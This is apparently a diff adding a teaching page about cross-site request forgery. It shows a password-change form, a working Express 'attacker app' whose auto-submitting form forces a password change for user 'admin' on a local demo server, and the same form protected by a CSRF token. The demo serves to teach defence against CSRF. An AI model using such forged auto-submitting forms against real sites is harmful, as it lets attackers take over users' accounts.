@@ -1,0 +1,60 @@
+<h1>Cross-site Request Forgery (CSRF)</h1>
+
+<pre>
+    Example attack
+    1. User sees the page with form for password modification like in following example
+
+        &lt;p id=&quot;status&quot;&gt;Change password:&lt;/p&gt;
+
+        &lt;form action=&quot;/csrf&quot; method=&quot;POST&quot;&gt;
+            &lt;label for=&quot;username&quot;&gt;Username:&lt;/label&gt;
+            &lt;input id=&quot;username&quot; type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;username&quot;/&gt;
+            &lt;br&gt;
+            &lt;label for=&quot;password&quot;&gt;Password:&lt;/label&gt;
+            &lt;input id=&quot;password&quot; type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot;/&gt;
+            &lt;br&gt;
+            &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; style=&quot;margin-top: 10px&quot;&gt;
+        &lt;/form&gt;
+
+    2. Attacker &quot;forges&quot; (creates a copy of) shown form with code that changes a password
+       Example: Create a JavaScript script file (e.g. <em>csrf.js</em>) and paste provided code:
+
+        import express from 'express'
+        const app = express()
+
+        app.get('/', (req, res) =&gt; {
+        const username = 'admin'
+        const password = 'desiredpassword'
+
+        res.send(`
+            &lt;h1&gt;Trick the User&lt;/h1&gt;
+            &lt;form id=&quot;attackform&quot; method=&quot;POST&quot; action=&quot;http://localhost:3030/csrf&quot;&gt;
+                &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;${username}&quot;&gt;
+                &lt;input type=&quot;text&quot; name=&quot;password&quot; value=&quot;${password}&quot;&gt;
+                &lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;
+            &lt;/form&gt;
+            &lt;script&gt;
+                document.getElementById('attackform').submit()
+            &lt;/script&gt;`)
+        })
+
+        app.listen(4000, () =&gt; {
+            console.info('Attacker App running on port: 4000')
+        })
+
+    3. The user changes the password, but the attacker can also change the password with the provided username of the user
+</pre>
+
+
+<p id="status">Change password:</p>
+
+<form action="csrf" method="POST">
+    <input type="hidden" name="_csrf" value="{{csrfToken}}">
+    <label for="username">Username:</label>
+    <input id="username" type="text" name="username" placeholder="username" />
+    <br>
+    <label for="password">Password:</label>
+    <input id="password" type="password" name="password" placeholder="password" />
+    <br>
+    <input type="submit" value="Submit" style="margin-top: 10px">
+</form>
